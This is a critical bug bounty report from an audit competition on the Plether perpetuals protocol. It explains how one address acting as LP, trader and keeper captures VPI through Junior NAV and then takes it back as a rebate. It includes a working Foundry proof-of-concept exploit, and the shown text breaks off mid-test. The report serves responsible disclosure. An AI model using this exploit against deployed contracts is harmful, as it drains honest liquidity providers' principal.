# \#97816 [SC-Critical] LP who is also a trader books its own VPI into Junior NAV, redeems it, and makes the remaining LPs pay the rebate

**Submitted on Nov 3rd 2026 at 11:47:14 UTC by @farismaulana for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97816
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

when a trader opens a position that increases skew, the VPI charge is paid into the HousePool and is counted as Junior LP value immediately, even though the same position takes that VPI back as a rebate when it closes. a single address that is both a Junior LP and a trader opens a skew-increasing position one minute before an LP epoch boundary, redeems its Junior shares at the inflated NAV right after the boundary, then closes and receives the rebate. the attacker gets its VPI back in full through the rebate and also collects its share of the same VPI through the redemption price. the rebate is paid out of the principal of the Junior LPs who stayed.

in the PoC, at release parameters and through public entry points only, an honest Junior LP that deposited 1_000_000 USDG loses 645.97 USDG per cycle on a 2_400_002 USDG pool, and honest LPs lose 4_504.82 USDG per cycle on a 9_800_002 USDG pool with Senior capital, while the attacker ends each cycle in profit. the cycle repeats every 3 hours with the same capital.

## Vulnerability Details

the VPI of a trade is a quadratic skew cost over pool depth, `V = k * S^2 / (2 * depth)`:

```solidity
        uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;
        if (vpiFactorWad != 0 && sqSkewOverDepthWad > type(uint256).max / vpiFactorWad) {
            return (false, 0);
        }
@>      uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
```

1. the open books the VPI as pool revenue on the spot

```solidity
        if (delta.tradeCostAssets > 0) {
            uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
            if (poolCashInflowAssets > 0) {
                IHousePool(host.pool())
                    .recordClaimantInflow(
                        poolCashInflowAssets,
@>                      IHousePool.ClaimantInflowKind.Revenue,
@>                      IHousePool.ClaimantInflowCashMode.CashArrived
                    );
            }
```

`recordClaimantInflow` adds it to `accountedAssets`:

```solidity
        if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
@>          accountedAssets += amount;
        }
```

the reconcile snapshot that prices both tranches is physical assets plus or minus the terminal price curve minus trader claims:

```solidity
    function buildReconcileSnapshot(
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
    ) internal pure returns (ReconcileSnapshot memory snapshot) {
@>      uint256 terminalAssets = engineSnapshot.physicalAssets;
@>      uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
        int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
```

nothing in it accounts for the VPI that an open position is entitled to take back. the terminal price curve has no VPI term either: each account's curve is built from its lots, entry cost and collectible cap, and the `vpiAccrued` field of `positions()` is skipped:

```solidity
@>      (uint256 size,,,, CfdTypes.Side side,,) = engine.positions(account);
        ...
        input = EngineCurveInput({
            lots: uint112(lots),
            entryCostAssetAtoms: uint144(entryCostAssetAtoms),
            collectibleCapAssetAtoms: uint144(candidateCapAssetAtoms),
            side: side
        });
```

so the whole VPI goes into `juniorPrincipal` at the next reconcile. in the PoC a 912_000 USDG LONG pays 1_732.80 USDG of VPI and Junior NAV rises by exactly 1_732.80 USDG at the same mark price.

2. the close hands the same VPI back to the trader out of pool cash

```solidity
        state.proportionalAccrualAssets =
            (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
        ...
        // Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
        // where an attacker opens at high depth, reduces pool depth, then closes to extract a
        // net-negative lifetime VPI rebate. ...
        if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
@>          state.vpiDeltaAssets = -state.proportionalAccrualAssets;
        }
```

a full close that brings skew back to where it was gets a VPI delta of `-V` on the same curve, and the clamp allows exactly `-V`. the rebate net of the close fee and carry becomes `actionRebateAssets` (`CfdEnginePlanLib.sol:1041-1061`), which is paid out of free pool cash:

```solidity
        if (delta.actionRebatePaidAssets > 0) {
@>          IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
            clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
        }
```

the clamp is the protocol's guard against VPI sandwiches, but it only stops the trader's lifetime VPI from going below zero. it says nothing about who owns the Junior shares between the moment the VPI is booked and the moment it is paid back.

3. a Junior redemption settled in between is priced with the VPI inside

```solidity
        _reconcile(accountingSnapshot, statusSnapshot);
        _checkpointEngineCarryIndexes();

        result.cutoffEpoch = cutoffEpoch;
        RedemptionPhase memory juniorPhase;
@>      juniorPhase.pricingPrincipal = juniorPrincipal;
        juniorPhase.pricingSupply = _juniorShareSupply();
```

timing is fully in the attacker's hands. a redeem request made before `lpEpochStart(E) - 5 minutes` belongs to epoch `E` (`TrancheVault.sol:545-556`) and matures at the first settlement after the boundary (`TrancheVault.sol:1431-1443`). `OrderRouter.settleLpEpoch` is permissionless and refreshes the mark in the same call (`OrderRouter.sol:474-484`), and order execution is permissionless, so the attacker executes its own orders. the attacker requests the redemption early in the hour, opens in the last minute, settles right after the boundary and closes. price exposure lasts about one minute.

attack path, with the numbers from the PoC (release risk, router and oracle parameters). one attacker address is Junior LP, trader and keeper. the pool holds 2_400_002 USDG: 1_000_000 deposited by an honest Junior LP, 1_400_000 deposited by the attacker and the two 1 USDG release seeds.

1. at T - 50 minutes the attacker requests a redemption of all its Junior shares, worth 1_399_999.99 USDG.
2. at T - 60 seconds the attacker commits a LONG of 9_120 lots (912_000 USDG notional, 0.38 of depth) and executes it itself. 1_732.80 USDG of VPI is paid into the pool and Junior NAV rises by the same 1_732.80.
3. right after the boundary the attacker calls `router.settleLpEpoch`. the redemption pays 1_401_010.80 USDG, which is 1_010.80 above the pre-open value of the attacker's shares.
4. the attacker closes. the clamp lets the full 1_732.80 VPI come back. the pool pays the rebate net of the 4 bps close fee from the cash of the LPs who stayed.
5. the honest LP's value goes from its 1_000_000 USDG deposit to 999_354.03 USDG (-645.97). the attacker ends +281.17 USDG after every fee and the treasury receives the 364.80 USDG open fee. the LPs' loss equals the attacker's gain plus the treasury fee to within 10 atoms.

the honest LP's loss is `f * V - fee * S`, where `f` is the attacker's share of Junior and `S` the notional (1_010.80 - 364.80 = 646.00, against 645.97 measured).

the same root cause also works on the deposit side. when skew already exists, a skew-reducing open receives its VPI rebate from the pool at open (`CfdEngineSettlementSidecar.sol:442-444`), which lowers Junior NAV. an attacker Junior deposit that settles at the next boundary buys shares at that lowered NAV. the close then charges the VPI back from the trader's reserved funds into Junior NAV, which the attacker now partly owns. in the PoC this costs the honest LP 420.86 USDG and gives the attacker 116.86 USDG.

this breaks the protocol's documented LP NAV guarantee that new LPs "do not inherit old trader obligations at a higher deposit NAV" (`SECURITY.md:859-860`). in the depth-neutral PoC run an honest LP deposits 1_500_000 USDG in the same epoch, is worth 1_499_999.99 right after entry, and ends at 1_499_221.32 once the older position closes at an unchanged price. it paid 778.68 USDG of a rebate owed to a position opened before it joined (4_698.50 USDG in the Senior run).

the root is an asymmetry in how the two VPI directions are booked. a negative VPI received at open is treated as provisional: the trader must keep a dedicated reserve of `max(-vpiAccrued, 0)` so the pool can claw it back (`SECURITY.md:866-867`). a positive VPI is reversible in exactly the same way, because the closing rebate offsets the charge previously paid up to its full amount (`CloseAccountingLib.sol:116-117`). yet it is booked as final Junior revenue at open, with no matching liability (`HousePoolAccountingLib.sol:63-64`).

## Impact Details

honest Junior LP principal is moved to the attacker. the loss does not depend on price direction, needs no privileged role and no second account (one address is LP, trader and keeper), and repeats as long as the attacker keeps cycling. measured with public entry points at release parameters:

| scenario | honest LP loss | attacker net gain |
| --- | --- | --- |
| one cycle, 2_400_002 USDG pool | 645.97 USDG | 281.17 USDG |
| five cycles, same capital | 3_230.54 USDG | 1_407.59 USDG |
| one cycle, 9_800_002 USDG pool with 3_130_000 Senior | 4_504.82 USDG | 3_015.22 USDG |
| five cycles, same pool | 22_401.46 USDG | 14_960.45 USDG |
| one cycle, same pool, widest confidence the oracle accepts | 3_430.86 USDG | 1_941.64 USDG |
| deposit-side variant, 2_400_002 USDG pool | 420.86 USDG | 116.86 USDG |

- with Senior capital present, honest LPs lose 4_504.82 USDG per cycle. a cycle takes 3 hours in the PoC (deposit, the 1 hour cooldown, one epoch), so it runs 8 cycles per day, and the attacker mints no new capital after the first cycle.
- oracle confidence does not protect the LPs. when every feed publishes the widest confidence the release oracle accepts (10 bps, `PletherOracle.sol:869-872`), each execution carries the maximum 2.5 bps adverse shift (`PletherOracle.sol:905-923`), and the Senior-pool cycle still costs honest LPs 3_430.86 USDG and nets the attacker 1_941.64 USDG.
- the loss scales with `f * V`, and at a fixed skew ratio `V` grows linearly with pool depth.
- the loss does not depend on the attacker's redemption shrinking the pool. when a new Junior deposit settles in the same epoch, the pool is deeper at the close (2_500_724.00 USDG) than at the open (2_401_734.80 USDG), so the rebate is not inflated by depth. the honest LPs still lose 576.17 USDG and the attacker gains 211.37 USDG.
- the control run does exactly the same open and close across the same boundary without the redemption. there the honest LP gains 152.53 USDG and the attacker loses 517.33 USDG, so the LP-side timing alone causes the loss.

the honest LP ends below the principal it deposited and the difference ends in the attacker's wallet. this is direct theft of at-rest user funds, which is Critical under the program's impact list.

## References

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol#L134-L138

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L463

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L647

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TerminalNavBookV2.sol#L418-L449

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L842

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L959

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1061

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L973-L977

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L621-L624

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L444

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L545-L556

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1431-L1443

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L869-L872

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L905-L923

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L859-L860

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L866-L867


## Proof of Concept

## Proof of Concept

the PoC deploys the protocol with the existing `BasePerpTest` fixture, which instantiates the repo's `LegacyOrderRouterHarness`, a test subclass that inherits `OrderRouter` unchanged; the PoC calls only the inherited production functions. it applies the release risk, router and oracle parameters, the release Senior capacity and the release 1 USDG seeds (`packages/perps/DEPLOYMENT.md:123-156`). honest LPs enter through `TrancheVault.requestDeposit`, `router.settleLpEpoch` and `claimDeposit`. one attacker address does everything through production entry points: the V3 `OrderRouter.commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice` and `settleLpEpoch`, `TrancheVault.requestDeposit/requestRedeem/claimDeposit/claimRedeem` and `MarginClearinghouse.deposit`. only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocked.

`VpiLpSandwichTest` runs on a pool with a 1_000_000 USDG honest Junior LP and a 1_400_000 USDG attacker Junior position. `VpiLpSandwichWithSeniorTest` reruns every test with an honest Senior LP of 3_130_000 USDG and a 5_670_000 USDG attacker Junior position, and adds the widest-confidence run.

create `packages/perps/test/poc/VpiLpSandwich.t.sol` with the following content:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

/// @notice One unprivileged address is a Junior LP, a trader and its own keeper. It books its own skew-increasing VPI
///         into Junior NAV, redeems at that NAV, then closes and takes the VPI back as a rebate paid by the LPs who
///         stayed. Release risk, router and oracle parameters (packages/perps/DEPLOYMENT.md:123-156). Honest LPs
///         enter through real TrancheVault requests. Every attacker call is a production entry point: the V3
///         OrderRouter.commitOrder(OrderRequest), executeOrder, updateMarkPrice and settleLpEpoch, the TrancheVault
///         request/claim functions and MarginClearinghouse.deposit. Only Pyth (MockPyth) and USDG are mocked.
contract VpiLpSandwichTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest Junior LP
    address internal constant BOB = address(0xB0B); // honest Senior LP (Senior variant only)
    address internal constant ATTACKER = address(0xBAD); // Junior LP, trader and keeper in one address
    address internal constant KEEPER = address(0xFEE0); // neutral keeper for setup and measurement marks
    uint256 internal constant LOT = 1e20; // 100 synthetic units = 100 USDG notional at 1.00
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant HONEST_JUNIOR = 1_000_000e6;

    uint256 internal attackerInjected; // every USDG minted to the attacker
    uint256 internal confidenceBps; // Pyth confidence published by the mock, in bps of price
    uint256 internal clientNonce;

    // ------------------------------------------------------------------ release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev Honest LP capital enters through real vault requests in setUp, not through the base fixture.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev Release seed positions: 1 USDG each (DEPLOYMENT.md:156).
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _attackerJunior() internal pure virtual returns (uint256) {
        return 1_400_000e6;
    }

    function _honestSenior() internal pure virtual returns (uint256) {
        return 0;
    }

    function setUp() public virtual override {
        super.setUp();
        // Release HousePool Senior capacity and release router/oracle configuration.
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.maxExecutionWindowSeconds = 60;
        rc.orderExecutionStalenessLimit = 60;
        rc.liquidationStalenessLimit = 15;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.orderSettlementWindow = 15;
        rc.maxComponentPublishTimeDivergence = 5;
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.minOpenNotionalAssets = 1000e6;
        rc.openOrderExecutionBountyBps = 1;
        rc.minOpenOrderExecutionBountyAssets = 10_000;
        rc.maxOpenOrderExecutionBountyAssets = 200_000;
        rc.positionProtectionTriggerBountyAssets = 200_000;
        rc.maxPendingOrders = 5;
        rc.maxPruneOrdersPerCall = 64;
        _setRouterConfig(rc);
        _warpToLiveWeekday();
        _refreshMark();
        assertFalse(engine.isOracleFrozen(), "setup: market must be live");

        settlementToken.mint(ALICE, HONEST_JUNIOR);
        _lpDeposit(juniorVault, ALICE, HONEST_JUNIOR, KEEPER);
        if (_honestSenior() != 0) {
            settlementToken.mint(BOB, _honestSenior());
            _lpDeposit(seniorVault, BOB, _honestSenior(), KEEPER);
        }
    }

    // ------------------------------------------------------------------ production-entry-point helpers

    function _warpToLiveWeekday() internal {
        uint256 ts = vm.getBlockTimestamp();
        uint256 dayIndex = ts / 1 days;
        uint256 dow = (dayIndex + 4) % 7; // 0 = Sunday
        uint256 target = (dayIndex + (2 + 7 - dow) % 7) * 1 days + 14 hours; // Tuesday 14:00 UTC
        if (target <= ts) {
            target += 7 days;
        }
        vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _epochStart(
        uint256 t
    ) internal pure returns (uint256) {
        return t - (t % 1 hours);
    }

    /// @dev Signed-style Pyth update at `price` with `confidenceBps` confidence on every feed. Publish time follows
    ///      BasePerpTest: a fresh block, one second later, and just after the queue head's commit when one is pending.
    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            SafeCast.toUint64(price * confidenceBps / 10_000),
            int32(-8),
            publishTime,
            publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _refreshMark() internal {
        bytes[] memory u = _pyth(PRICE);
        vm.prank(KEEPER);
        router.updateMarkPrice(u);
    }

    function _settleEpochAs(
        address caller
    ) internal {
        bytes[] memory u = _pyth(PRICE);
        vm.prank(caller);
        router.settleLpEpoch(u);
    }

    /// @dev Requests a deposit, settles it at the next epoch boundary through the Router and claims the shares.
    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount,
        address settler
    ) internal {
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(id) + 1);
        _settleEpochAs(settler);
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        assertEq(claimable, amount, "deposit settled in full");
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    /// @dev Tops the attacker wallet up to `amount`, minting (and recording) only the shortfall.
    function _ensureAttackerWallet(
        uint256 amount
    ) internal {
        uint256 held = settlementToken.balanceOf(ATTACKER);
        if (held < amount) {
            settlementToken.mint(ATTACKER, amount - held);
            attackerInjected += amount - held;
        }
    }

    /// @dev Tops the attacker's clearinghouse balance up to `amount` from its wallet.
    function _ensureAttackerMargin(
        uint256 amount
    ) internal {
        uint256 balance = clearinghouse.balanceAssets(ATTACKER);
        if (balance >= amount) {
            return;
        }
        uint256 shortfall = amount - balance;
        _ensureAttackerWallet(shortfall);
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(clearinghouse), shortfall);
        clearinghouse.deposit(ATTACKER, shortfall);
        vm.stopPrank();
    }

    /// @dev Production V3 order request with permissive caller-chosen bounds.
    function _request(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("vpi-lp-sandwich", ++clientNonce));
        r.side = side;
        r.sizeDelta = sizeDelta;
        r.marginDelta = marginDelta;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev `account` commits through the production V3 entry point; `executor` executes it in the next block.
    function _commitAndExecute(
        address account,
        address executor,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory r = _request(side, size, margin, isClose);
        vm.prank(account);
        uint64 orderId = router.commitOrder(r);
        bytes[] memory u = _pyth(PRICE);
        vm.prank(executor);
        router.executeOrder(orderId, u);
    }

    function _honestValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(ALICE))
            + seniorVault.convertToAssets(seniorVault.balanceOf(BOB));
    }

    function _honestPrincipal() internal pure returns (uint256) {
        return HONEST_JUNIOR + _honestSenior();
    }

    /// @dev Release seed positions held by the test contract (passive LPs).
    function _seedValue() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)))
            + seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    /// @dev Attacker wallet + clearinghouse balance + Junior shares, net of every USDG minted to it.
    function _attackerNetWealth() internal view returns (int256) {
        uint256 w = settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
        return int256(w) - int256(attackerInjected);
    }

    function _treasury() internal view returns (uint256) {
        return clearinghouse.balanceAssets(engine.protocolTreasury());
    }

    /// @dev The attacker deposits its Junior capital, then waits out the 1 hour cooldown inside the next epoch.
    function _becomeLp() internal {
        _ensureAttackerWallet(_attackerJunior());
        _lpDeposit(juniorVault, ATTACKER, _attackerJunior(), ATTACKER);
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 600);
        _refreshMark();
    }

    /// @dev Opens the largest round-lot LONG under the 0.4 skew cap, one minute before the next LP epoch boundary.
    function _openNearBoundary() internal returns (uint256 size, uint256 navRise) {
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours - 60);
        _refreshMark();
        uint256 lots = pool.totalAssets() * 38 / 100 / 100e6;
        size = lots * LOT;
        uint256 margin = lots * 100e6 * 250 / 10_000; // 2.5% of notional
        _ensureAttackerMargin(margin + 100e6);
        uint256 navBefore = juniorVault.totalAssets();
        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.LONG, size, margin, false);
        navRise = juniorVault.totalAssets() - navBefore;
        (uint256 opened,,,,,,) = engine.positions(ATTACKER);
        assertEq(opened, size, "open must execute");
    }

    struct Cycle {
        uint256 lpValuePreOpen;
        uint256 vpi;
        uint256 navRise;
        uint256 redeemed;
        uint256 notional;
    }

    /// @dev One full cycle by the attacker address alone.
    function _sandwich() internal returns (Cycle memory c) {
        // 1. Queue a redemption of every attacker Junior share for the next epoch boundary.
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        c.lpValuePreOpen = juniorVault.convertToAssets(shares);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);

        // 2. One minute before the boundary, open a skew-increasing LONG; its VPI lands in Junior NAV.
        uint256 size;
        (size, c.navRise) = _openNearBoundary();
        c.notional = size / LOT * 100e6;
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        c.vpi = uint256(vpiAccrued);

        // 3. Right after the boundary the attacker settles the epoch; the redemption is priced with the VPI inside.
        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 1);
        _settleEpochAs(ATTACKER);
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(claimable, shares, "full redemption funded");
        vm.prank(ATTACKER);
        c.redeemed = juniorVault.claimRedeem(redeemId, claimable, ATTACKER, ATTACKER);

        // 4. Close; the skew-reducing close returns the VPI as a rebate paid out of the remaining LPs' cash.
        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.LONG, size, 0, true);
        (uint256 left,,,,,,) = engine.positions(ATTACKER);
        assertEq(left, 0, "close must execute");
    }

    // ------------------------------------------------------------------ tests

    function test_VpiLpSandwich_HonestLpLosesAttackerGains() public {
        _becomeLp();
        uint256 honestStart = _honestValue();
        uint256 seedStart = _seedValue();
        uint256 treasuryStart = _treasury();
        int256 attackerStart = _attackerNetWealth();
        console2.log("honest LP principal      ", _honestPrincipal());
        console2.log("pool depth at start      ", pool.totalAssets());

        Cycle memory c = _sandwich();

        _refreshMark();
        uint256 honestEnd = _honestValue();
        uint256 attackerGain = uint256(_attackerNetWealth() - attackerStart);
        uint256 treasuryGain = _treasury() - treasuryStart;
        uint256 lpLoss = (honestStart - honestEnd) + (seedStart - _seedValue());
        console2.log("position notional        ", c.notional);
        console2.log("open VPI                 ", c.vpi);
        console2.log("Junior NAV rise on open  ", c.navRise);
        console2.log("attacker LP value pre-open", c.lpValuePreOpen);
        console2.log("attacker redeemed assets ", c.redeemed);
        console2.log("honest LP value start    ", honestStart);
        console2.log("honest LP value end      ", honestEnd);
        console2.log("honest LP loss           ", honestStart - honestEnd);
        console2.log("attacker net gain        ", attackerGain);
        console2.log("treasury fees            ", treasuryGain);

        assertGt(c.redeemed, c.lpValuePreOpen, "redemption captured the attacker's own VPI");
        assertLt(honestEnd, _honestPrincipal(), "honest LP ends below its deposited principal");
        assertGt(attackerGain, 0, "attacker profited");
        // Closed system: every USDG the LPs lost is in the attacker's hands or the treasury (rounding only).
        assertApproxEqAbs(lpLoss, attackerGain + treasuryGain, 10, "LP loss = attacker gain + treasury fees");
    }

    /// @dev Five back-to-back cycles. The attacker mints nothing after the first cycle: the same capital repeats.
    function test_VpiLpSandwich_RepeatsEveryCycle() public {
        uint256 honestStart = _honestValue();
        int256 attackerStart = _attackerNetWealth();
        uint256 injectedAfterFirst;
        for (uint256 i; i < 5; ++i) {
            _becomeLp();
            uint256 h0 = _honestValue();
            _sandwich();
            _refreshMark();
            console2.log("cycle honest loss        ", h0 - _honestValue());
            if (i == 0) {
                injectedAfterFirst = attackerInjected;
            }
        }
        uint256 honestEnd = _honestValue();
        uint256 attackerGain = uint256(_attackerNetWealth() - attackerStart);
        console2.log("attacker capital minted  ", attackerInjected);
        console2.log("honest LP value start    ", honestStart);
        console2.log("honest LP value end      ", honestEnd);
        console2.log("honest LP loss, 5 cycles ", honestStart - honestEnd);
        console2.log("attacker gain, 5 cycles  ", attackerGain);
        assertEq(attackerInjected, injectedAfterFirst, "no new attacker capital after the first cycle");
        assertLt(honestEnd, honestStart, "honest LP lost principal");
        assertGt(attackerGain, 0, "attacker profited");
    }

    /// @dev A new honest Junior deposit settles in the same epoch as the attacker's redemption, so the pool is deeper
    ///      at the close than at the open: the rebate is no larger than the curve at the opening depth. The new LP
    ///      pays part of a rebate owed to a position opened before it joined.
    function test_VpiLpSandwich_CloseDepthNotBelowOpenDepth() public {
        address carol = address(0xCA201);
        uint256 carolDeposit = _attackerJunior() + 100_000e6;
        _becomeLp();
        uint256 honestStart = _honestValue();
        int256 attackerStart = _attackerNetWealth();

        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        settlementToken.mint(carol, carolDeposit);
        vm.startPrank(carol);
        settlementToken.approve(address(juniorVault), carolDeposit);
        uint256 depositId = juniorVault.requestDeposit(carolDeposit, carol, carol);
        vm.stopPrank();

        (uint256 size,) = _openNearBoundary();
        uint256 depthAtOpen = pool.totalAssets();

        vm.warp(_epochStart(vm.getBlockTimestamp()) + 1 hours + 1);
        _settleEpochAs(ATTACKER);
        uint256 atkClaimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        assertEq(atkClaimable, shares, "full redemption funded");
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(redeemId, atkClaimable, ATTACKER, ATTACKER);
        uint256 carolClaimable = juniorVault.claimableDepositRequest(depositId, carol);
        assertEq(carolClaimable, carolDeposit, "new LP deposit settled in the same epoch");
        vm.prank(carol);
        juniorVault.claimDeposit(depositId, carolClaimable, carol, carol);
        uint256 depthAtClose = pool.totalAssets();
        uint256 newLpAtEntry = juniorVault.convertToAssets(juniorVault.balanceOf(carol));

        _commitAndExecute(ATTACKER, ATTACKER, CfdTypes.Side.LONG, size, 0, true);
        _refreshMark();

